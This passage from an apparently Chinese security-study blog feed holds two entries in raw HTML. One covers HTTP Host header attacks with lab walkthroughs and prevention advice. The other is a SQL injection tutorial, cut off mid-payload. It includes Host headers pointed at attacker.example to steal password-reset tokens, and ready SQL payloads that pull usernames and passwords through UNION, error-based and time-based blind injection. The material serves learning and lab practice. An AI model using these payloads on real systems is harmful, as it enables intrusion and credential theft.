class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br>    attacker.example<br>    或者<br>GET /example HTTP/1.1<br>    Host: attacker.example<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br></code></pre></td></tr></table></figure><p>   总之就是利用前后端或者不同组件的处理差异 绕过限制，解析危险注入</p><h3 id="4-注入host覆盖标头"><a href="#4-注入host覆盖标头" class="headerlink" title="4.注入host覆盖标头"></a>4.注入host覆盖标头</h3><ul><li><code>X-Host</code></li><li><code>X-Forwarded-Server</code></li><li><code>X-HTTP-Host-Override</code></li><li><code>Forwarded</code></li><li>Param Miner扩展可以guess header</li></ul><h2 id="利用漏洞："><a href="#利用漏洞：" class="headerlink" title="利用漏洞："></a>利用漏洞：</h2><h3 id="1-密码重置中毒"><a href="#1-密码重置中毒" class="headerlink" title="1. 密码重置中毒"></a>1. 密码重置中毒</h3><p>​（实验室1,2）</p><p>​密码重置投毒是一种攻击者利用漏洞网站生成指向其控制域名的密码重置链接的技术。攻击者可以利用此行为窃取重置任意用户密码所需的秘密令牌，最终盗取用户的账户。</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028153941036.png"></p><p>​首先我们要先知道常见的重置密码功能。</p><ul><li><p>用户输入要修改的账户的email </p></li><li><p>网站为这个账号生成一个token并在后端关联</p></li><li><p>网站给email发包含token的邮件，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j<br></code></pre></td></tr></table></figure></li><li><p>用户访问，网站验证token有效性并确定要重置的账号。最后改好后销毁token</p></li></ul><p>​所以攻击的关键就是窃取token，通常思路就是通过host指向我们的服务器网址，构造威胁链接，等受害者点击，来外带窃取token。或者通过各种waf的绕过，构造悬挂拼接</p><h3 id="2-通过Host进行-Web-缓存中毒"><a href="#2-通过Host进行-Web-缓存中毒" class="headerlink" title="2.通过Host进行 Web 缓存中毒"></a>2.通过Host进行 Web 缓存中毒</h3><p>​（实验室3）</p><p>​看标题就能想个大概了，web缓存中毒通常就是利用源服务器和Cache的解析歧义，写入有毒缓存。而Host也有可能因为歧义导致解析不同（双重覆盖等见测试的第3.）</p><p>​贴一下<a href="https://i4g5d.github.io/2025/10/19/web-cache2/">web缓存中毒</a></p><h3 id="3-利用经典的服务器端漏洞"><a href="#3-利用经典的服务器端漏洞" class="headerlink" title="3.利用经典的服务器端漏洞"></a>3.利用经典的服务器端漏洞</h3><p>​（实验室4）</p><p>​每个 HTTP 标头都是利用经典服务器端漏洞的潜在载体，比如host有可能进行sql注入，或者host伪装成内网本地用户</p><h3 id="4-使用虚拟主机暴力破解访问内部网站"><a href="#4-使用虚拟主机暴力破解访问内部网站" class="headerlink" title="4.使用虚拟主机暴力破解访问内部网站"></a>4.使用虚拟主机暴力破解访问内部网站</h3><p>​许多服务器同时承载多个虚拟主机（vhosts），如果公共站点与内网站点部署在同一台机器上，攻击者只要猜到内部主机名（或暴力枚举子域名），就能通过把请求发到该服务器并在请求里写入 <code>Host</code>&#x2F;SNI 来访问那些“隐藏”的站点 —— 即使内部站点没有公开 DNS 记录。</p><h3 id="5-基于路由的-SSRF"><a href="#5-基于路由的-SSRF" class="headerlink" title="5.基于路由的 SSRF"></a>5.基于路由的 SSRF</h3><p>​（实验室5,6）</p><p>​路由就是（负载均衡器、CDN、反向代理、API 网关）根据客户端的各种信息，请求不同后端服务</p><p>​通常SSRF要通过XXE或者业务逻辑漏洞，</p><p>​很多组件会根据Host决定路由并发起解析&#x2F;请求到那个主机名或IP</p><p>​<strong>先用 Collaborator 验证“能把请求路由到任意域”</strong>，确认后<strong>就可以尝试把请求指向内网地址做进一步探测或枚举</strong></p><p>通查要结合前面测试漏洞中的各种方法绕过WAF或者运行逻辑，比如考虑覆盖，考虑绝对路劲，考虑各种歧义，非数字端口，编码等等</p><h3 id="6-连接状态攻击"><a href="#6-连接状态攻击" class="headerlink" title="6.连接状态攻击"></a>6.连接状态攻击</h3><p>​（实验室7）</p><p>​可以理解为web反向中毒（但原理完全不同），先留下安全的请求记忆，这个时候服务器可能会放松警惕，就能发送危险请求（连续建立）</p><ul><li>HTTP&#x2F;1.1 支持<strong>持久连接（keep-alive）</strong>：客户端和服务端在同一 TCP 连接上可以连续发送多个请求&#x2F;接收多个响应，以减少握手开销。</li><li>有些服务器或中间件为了性能或实现简化，会在“连接级别”缓存&#x2F;记住第一次请求的某些字段（比如 Host、某些 header、或已经验证过的状态），而不会在每个后续请求都做严格验证。</li><li>攻击者就可以利用这一点：先发一个“安全”的请求通过校验，然后在同一连接里紧接着发一个“恶意”请求（Host 不同、路径恶意、payload 注入等），后端可能会直接处理第二个请求而不重新做全部安全检查。</li></ul><h3 id="7-通过格式错误的请求行进行-SSRF"><a href="#7-通过格式错误的请求行进行-SSRF" class="headerlink" title="7.通过格式错误的请求行进行 SSRF"></a>7.通过格式错误的请求行进行 SSRF</h3><ul><li><p>HTTP 的请求行通常长这样：<code>GET /path HTTP/1.1</code> —— path 以 <code>/</code> 开头。</p></li><li><p>有些自制的反向代理实现为了把客户端请求转发到上游，会直接把 request line 的 path 直接拼到上游 base URL 后面（字符串拼接），例如：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">upstream_base</span> = <span class="hljs-string">&quot;http://backend-server&quot;</span><br><span class="hljs-attr">upstream_url</span> = upstream_base + path_from_request_line<br></code></pre></td></tr></table></figure></li><li><p>如果 <code>path_from_request_line</code> 是常规的 <code>/foo</code>，拼接结果是 <code>http://backend-server/foo</code>，正常。但如果 path 是 <code>@internal</code>，拼接后就是 <code>http://backend-server@internal</code>。大多数 URL 解析器把 <code>user:pass@host</code> 当作“userinfo@host”，因此 <code>backend-server@internal</code> 被解析为：</p><ul><li>username &#x3D; <code>backend-server</code></li><li>host &#x3D; <code>internal</code></li></ul></li><li><p>也就是说，本来想访问 <code>backend-server</code>，被代理误导成去访问 <code>internal</code> —— 攻击者就能让代理去访问 <code>internal</code>（很可能是内网地址或其他受限主机）。</p></li></ul><h2 id="预防漏洞："><a href="#预防漏洞：" class="headerlink" title="预防漏洞："></a>预防漏洞：</h2><pre><code class="hljs">- 尽量不用HOST的内容拼接，可以用相对路径完成功能- Host白名单验证- 不信任XFH等代替头- 规范化后端和边缘层- 默认/回退 vhost 应安全处理，例如重定向或404</code></pre><h2 id="Labs："><a href="#Labs：" class="headerlink" title="Labs："></a>Labs：</h2><h3 id="1-实验室：基本密码重置中毒"><a href="#1-实验室：基本密码重置中毒" class="headerlink" title="1.实验室：基本密码重置中毒"></a>1.实验室：基本密码重置中毒</h3><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028160000126.png"></p><p>在修改密码界面，看到是可以通过提交邮箱或用户名的，我想要carlos的密码，那就用用户名</p><p>但不知道修改密码的具体细节，先看看更改密码的host有什么用</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028180823878.png"></p><p>可以看到，相应中没有直接回显host头，但在更改密码邮件地址中域名变成了host的test</p><p>那是不是只要把host值改为能外带出token的就可以，</p><p>于是采用加入bp的collaborator</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028181219300.png"></p><p>轮询后拿到token</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028181234652.png"></p><p>把窃取到的token换上去就等于拿到了carlos邮件上的更改密码链接，修改即可</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028181325538.png"></p><h3 id="2-实验室：通过悬垂标记进行密码重置中毒"><a href="#2-实验室：通过悬垂标记进行密码重置中毒" class="headerlink" title="2.实验室：通过悬垂标记进行密码重置中毒"></a>2.实验室：通过悬垂标记进行密码重置中毒</h3><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028181713663.png"></p><p>这里想随意的输入host或者输入攻击者网站，都被拒绝了，就像提示说的可能是因为防病毒软件</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028182430199.png"></p><p>而且这次不是窃取token，而是直接给新密码了</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028182703896.png"></p><p>点这个 View raw看看详细</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028182724187.png"></p><p>里面是一个html， 看到这里就想进行拼接来构造攻击了</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028184216598.png"></p><p>看看有没有特殊分隔符，能绕过检测，发现能用<code>:</code>那不就是非数字端口</p><p>于是构造</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028184832995.png"></p><p>轮询也能成功带出数据（OOB）</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028185210133.png"></p><p>接下来把修改密码的用户换成carlos进行攻击即可</p><h3 id="3-实验室：通过模糊请求进行-Web-缓存中毒"><a href="#3-实验室：通过模糊请求进行-Web-缓存中毒" class="headerlink" title="3.实验室：通过模糊请求进行 Web 缓存中毒"></a>3.实验室：通过模糊请求进行 Web 缓存中毒</h3><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028190224972.png"></p><p>首先随意找到一个有Cache机制的静态页面</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028190614281.png"></p><p>更改Host，简单测试发现 Host表头能进行覆盖，并能直接出现在响应</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028190852377.png"></p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028190903820.png"></p><p>接下来思路就是把test换成我们的攻击者服务器，目的是存入自动解析我们危险链接的缓存</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028191120456.png"></p><p>忽然发现alert成功执行了但是解不开，又发现主界面也有缓存，用主界面再过一遍即可</p><h3 id="4-实验室：绕过主机头身份验证"><a href="#4-实验室：绕过主机头身份验证" class="headerlink" title="4.实验室：绕过主机头身份验证"></a>4.实验室：绕过主机头身份验证</h3><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028191753239.png"></p><p>没有任何线索，扫描器扫一下 扫出了robots.txt</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028192849439.png"></p><p>访问看看</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028193227319.png"></p><p>那是不是提示我们本地访问，那就把host改成本地 127.0.0.1失败就localhost</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028193455657.png"></p><h3 id="5-实验室：基于路由的-SSRF"><a href="#5-实验室：基于路由的-SSRF" class="headerlink" title="5.实验室：基于路由的 SSRF"></a>5.实验室：基于路由的 SSRF</h3><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028210133033.png"></p><p>Host访问test时报错504</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028210802329.png"></p><p>说明要么是白名单过滤了，要么是host访问不到东西，</p><p>插入collaborator试试</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028211225088.png"></p><p>好像直接对这个网址进行了访问，试试能不能访问内网</p><p>按题目要求访问网段192.168.0.0&#x2F;24，爆破后出现了奇怪的现象，只能爆出404</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028212802880.png"></p><p>怀疑是路由没权限？翻到根目录，就成功访问了</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028212853795.png"></p><p>跟随跳转，得到新页面</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028212944078.png"></p><h3 id="6-实验室：通过有缺陷的请求解析实现-SSRF"><a href="#6-实验室：通过有缺陷的请求解析实现-SSRF" class="headerlink" title="6.实验室：通过有缺陷的请求解析实现 SSRF"></a>6.实验室：通过有缺陷的请求解析实现 SSRF</h3><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028215811423.png"></p><p>这次无论尝试随便输入还是注入collaborator都是回显禁止</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028220458548.png"></p><p>那我怀疑可能就是要绕过某些WAF</p><p>尝试两条HOST，报错了。尝试非数字端口也失败了</p><p>尝试请求行URL，居然成功了</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028221310097.png"></p><p>其实还能想拆行，XFH头覆盖等</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028221535879.png"></p><p>重定向到admin，但403了，怀疑是路劲问题</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028221650170.png"></p><p>那把绝对路径也换成admin，解决问题</p><h3 id="7-实验室：通过连接状态攻击绕过主机验证"><a href="#7-实验室：通过连接状态攻击绕过主机验证" class="headerlink" title="7.实验室：通过连接状态攻击绕过主机验证"></a>7.实验室：通过连接状态攻击绕过主机验证</h3><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028223308709.png"></p><p>题目的提示很明白了，按照信息做就行，其实就是先发一个请求，趁它记着某些字段的时候做一个SSRF，所以成组，共同发包</p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028223923717.png"></p><p>通过这里构造删除的请求<img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028224253595.png"></p><p><img src="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/image-20251028225051610.png"></p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
    <categories>
      
      <category>web安全专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLI</title>
    <link href="/2025/10/23/SQLI/"/>
    <url>/2025/10/23/SQLI/</url>
    
    <content type="html"><![CDATA[<p>  做为作为基础，也最为重要的漏洞之一，这里总结SQL注入</p><h2 id="SQLI原理："><a href="#SQLI原理：" class="headerlink" title="SQLI原理："></a>SQLI原理：</h2><ol><li><p>形成原因：</p><p>​    当web应用向后台数据库传递<a href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></li><li><p>本质：</p><p>​    用户能控制输入的内容； web应用把用户输入的内容带入到数据库当代码执行；</p></li></ol><h2 id="SQL注入思路："><a href="#SQL注入思路：" class="headerlink" title="SQL注入思路："></a>SQL注入思路：</h2><h3 id="1-判断可靠输入点"><a href="#1-判断可靠输入点" class="headerlink" title="1. 判断可靠输入点"></a>1. 判断可靠输入点</h3><ol><li><p>GET&#x2F;POST参数</p><p>要判断我们传入的参数如何和数据库交互，判断如何闭</p></li><li><p>Cookie</p><p>有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息。</p></li><li><p>Referer注入</p><p>有些网站会记录ip和访问路径，例如百度就是通过Referer来统计网站流量，我们将访问路径进行SQL注入，同样也可以得到想要的信息。</p></li><li><p>XFF注入</p><p>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ ，用户在注册的时候，如果存在安全隐患，会出现错误页面或者报错。从而导致注册或者登录用户失败。</p></li><li><p>UA注入</p></li></ol><h3 id="2-判断库类型"><a href="#2-判断库类型" class="headerlink" title="2. 判断库类型"></a>2. 判断库类型</h3><p>​常见数据库就是MYSQL(3306)，SQLserver(1443)，Oracle(1521)，SQLite(无),PostgreSQL(5432)。</p><p>​判断方法主要就是</p><ul><li><p>数据库特有的函数</p><table><thead><tr><th>数据库</th><th>特有函数</th><th>示例 payload</th><th>判断逻辑</th></tr></thead><tbody><tr><td><strong>MySQL</strong></td><td><code>version()</code>、<code>database()</code>、<code>sleep()</code></td><td><code>&#39; UNION SELECT version()--+</code></td><td>如果返回类似 <code>8.0.33</code> → 确认是 MySQL</td></tr><tr><td><strong>PostgreSQL</strong></td><td><code>current_database()</code>、<code>pg_sleep()</code>、<code>VERSION()</code></td><td><code>&#39; UNION SELECT pg_sleep(5)--+</code></td><td>页面延迟 5 秒 → PostgreSQL</td></tr><tr><td><strong>SQL Server</strong></td><td><code>@@version</code>、<code>db_name()</code>、<code>waitfor delay</code></td><td><code>&#39; UNION SELECT @@version--+</code></td><td>返回 “Microsoft SQL Server” 或延迟 5 秒</td></tr><tr><td><strong>Oracle</strong></td><td><code>banner</code> from <code>v$version</code>、<code>dbms_pipe.receive_message</code></td><td><code>&#39; UNION SELECT banner FROM v$version--+</code></td><td>报错&#x2F;回显包含 “Oracle Database”</td></tr><tr><td><strong>SQLite</strong></td><td><code>sqlite_version()</code></td><td><code>&#39; UNION SELECT sqlite_version()--+</code></td><td>返回 <code>3.x.x</code></td></tr></tbody></table></li><li><p>数据库专属符号来判断，如注释符号、多语句查询符等等</p><table><thead><tr><th>特征类型</th><th>MySQL</th><th>SQL Server</th><th>Oracle</th><th>PostgreSQL</th><th>SQLite</th></tr></thead><tbody><tr><td><strong>单行注释</strong></td><td><code>--+</code> 或 <code>#</code></td><td><code>--+</code></td><td><code>--+</code></td><td><code>--+</code></td><td><code>--+</code></td></tr><tr><td><strong>多语句执行</strong></td><td><code>;</code></td><td><code>;</code></td><td>不支持（默认）</td><td>支持</td><td>支持</td></tr><tr><td><strong>字符串连接符</strong></td><td><code>concat(&#39;a&#39;,&#39;b&#39;)</code></td><td><code>&#39;a&#39;+&#39;b&#39;</code></td><td>&#96;’a’</td><td></td><td>‘b’&#96;</td></tr></tbody></table></li><li><p>报错信息</p></li><li><p>其他数据库特性</p></li></ul><p>​</p><h3 id="3-判断参数类型"><a href="#3-判断参数类型" class="headerlink" title="3.判断参数类型"></a>3.判断参数类型</h3><p>​通过+1，-1，and，or，注释符的组合进行刺探。（数值型，字符型，闭合类型）</p><ul><li>id&#x3D;1 and 1&#x3D;1回显正常            id&#x3D;1 and1&#x3D;2回显错误（判断为整形）</li><li>id&#x3D;1 and 1&#x3D;1和id&#x3D;1 and 1&#x3D;2回显正常（判断为字符型接下来判断闭合方式）</li><li>id&#x3D;1’ and ‘1’&#x3D;’1回显正确         id&#x3D;1’ and ‘1’&#x3D;’2回显错误（判断为【’】闭合）</li><li>id&#x3D;1” and “1”&#x3D;”1 回显正常     id&#x3D;1” and “1”&#x3D;”2回显错误（判断为【”】闭合）</li><li>SQL语法支持一个或多个「括号」包裹参数，上述三种都可能带个括号。</li></ul><h3 id="4-判断过滤"><a href="#4-判断过滤" class="headerlink" title="4.判断过滤"></a>4.判断过滤</h3><p>已经确定的库类型，注入参数类型，就可以开始注入了，但过滤是肯定存在的。</p><ul><li>参数会有过滤</li><li>没有显示位；就考虑报错注入或者时间注入</li><li>没有报错信息；就不能报错注入</li></ul><h3 id="5-注入方式"><a href="#5-注入方式" class="headerlink" title="5.注入方式"></a>5.注入方式</h3><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>​前提要有回显，要先查到列数；</p><ol><li><p>判断列数 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>；<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure></li><li><p>看看这几列的回显位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>  <br></code></pre></td></tr></table></figure></li><li><p>查库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+  </span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name），<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><details>     <summary>**关于将id值设置为0或者负数的解释**</summary>              由于我们的语句是插入到原有语句后面，这样就会出现两个SQL语句同时执行，由于SQL查询会默认返回一行数据，所以我们插入的第二行语句的结果就不会被返回，只会返回原有的SQL语句的查询内容。 要让数据库查询我们插入的语句，需要让原有SQL语句产生查询错误，注意：查询错误不是语法错误，查询错误只会返回空，不会让语句报错。 所以我们可以使id=0或id=-1，零或负数不会被用作id值，它插入进去一定导致原有SQL语句查询结果为空，我们插入的SQL语句的结果就会被返回。 </details></li><li><p>查表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="hljs-string">或把table_name换成具体表名：</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-comment">--+</span><br>(去掉引号用HEX编码)<br></code></pre></td></tr></table></figure></li><li><p>查字段名和具体数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>name<span class="hljs-string">&#x27;</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,password) <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>​前提：页面会显示数据库报错信息。</p><p>​<code>updatexml()</code>（<code>extractvalue</code>） 在 MySQL 中用于对 XML 数据执行 XPath 操作。它的调用签名像 <code>updatexml(xml_doc, xpath_expr, new_value)</code>。当第二个参数（xpath 表达式）不是合法的 XPath 或无法解析时，MySQL 会抛出一个错误，并且错误信息会包含供解析的那个字符串（也就是我们传入的 <code>concat(...)</code> 的结果）。</p><ol><li><p>查库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((database()),<span class="hljs-built_in">floor</span> (rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="（时间-布尔）盲注"><a href="#（时间-布尔）盲注" class="headerlink" title="（时间&#x2F;布尔）盲注"></a>（时间&#x2F;布尔）盲注</h3><p>​因为是盲猜，所以无论是布尔还是时间都会很慢</p><p>​盲注主要是通过if语句去一个一个猜个数，猜字符。所以时间盲注只不过是把布尔盲注的响应换成sleep时间，所以下面主要以时间盲注为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(条件,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>)；substr(str,<span class="hljs-keyword">from</span>,length)；limit 选填偏移量 行数；<br></code></pre></td></tr></table></figure><ol><li><p>爆库个数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata)<span class="hljs-operator">=</span><span class="hljs-number">9</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ol start="2"><li>一个个爆库名长度</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> length(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata limit0,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">18</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ol start="3"><li>在知道长度基础上一个一个判断字符</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> ascii(substr((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit0,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">105</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<br><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if(substr((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit0,<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">110</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-operator">/</span><span 